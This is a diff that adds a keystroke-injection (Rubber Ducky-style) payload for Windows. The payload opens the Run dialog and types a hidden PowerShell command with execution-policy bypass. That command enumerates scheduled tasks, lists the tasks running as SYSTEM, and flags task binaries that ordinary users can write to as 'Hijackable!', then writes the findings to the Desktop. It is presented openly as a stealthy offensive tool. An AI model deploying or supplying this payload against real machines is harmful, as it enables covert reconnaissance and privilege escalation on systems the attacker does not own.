@@ -1,0 +1,12 @@
+REM ============================================
+REM  FU PERSON | Scheduled Task Enumeration
+REM  FLLC - by PERSON FU
+REM  Time: ~10 seconds | Stealth: HIGH
+REM  Enumerates all tasks, finds hijackable ones
+REM ============================================
+DELAY 500
+GUI r
+DELAY 400
+STRING powershell -w hidden -ep bypass -c "$o=[Environment]::GetFolderPath('Desktop')+'\schtasks_enum.txt';$r=@();$r+='=== SCHEDULED TASK ENUMERATION ===';$r+='Time: '+(Get-Date);$r+='';$r+='=== ALL TASKS WITH COMMANDS ===';Get-ScheduledTask|?{$_.State -ne 'Disabled'}|%{$info=Get-ScheduledTaskInfo $_.TaskName -ea 0;$r+='Task: '+$_.TaskPath+$_.TaskName;$r+='State: '+$_.State;$r+='RunAs: '+$_.Principal.UserId;$r+='RunLevel: '+$_.Principal.RunLevel;$a=$_.Actions|select -f 1;if($a){$r+='Execute: '+$a.Execute+' '+$a.Arguments};if($info){$r+='LastRun: '+$info.LastRunTime;$r+='NextRun: '+$info.NextRunTime};$r+=''};$r+='=== TASKS RUNNING AS SYSTEM ===';Get-ScheduledTask|?{$_.Principal.UserId -match 'SYSTEM|LOCAL'}|%{$r+=$_.TaskPath+$_.TaskName+' -> '+($_.Actions|select -f 1).Execute};$r+='';$r+='=== WRITABLE TASK BINARIES (Hijackable!) ===';Get-ScheduledTask|?{$_.State -ne 'Disabled'}|%{$exe=($_.Actions|select -f 1).Execute;if($exe -and (Test-Path $exe -ea 0)){$acl=Get-Acl $exe -ea 0;$acl.Access|?{$_.FileSystemRights -match 'Write|FullControl' -and $_.IdentityReference -match 'Users|Everyone|Authenticated'}|%{$r+='[!] WRITABLE: '+$exe+' by '+$_.IdentityReference}}};$r|Out-File $o -Encoding UTF8"
+ENTER
+DELAY 500
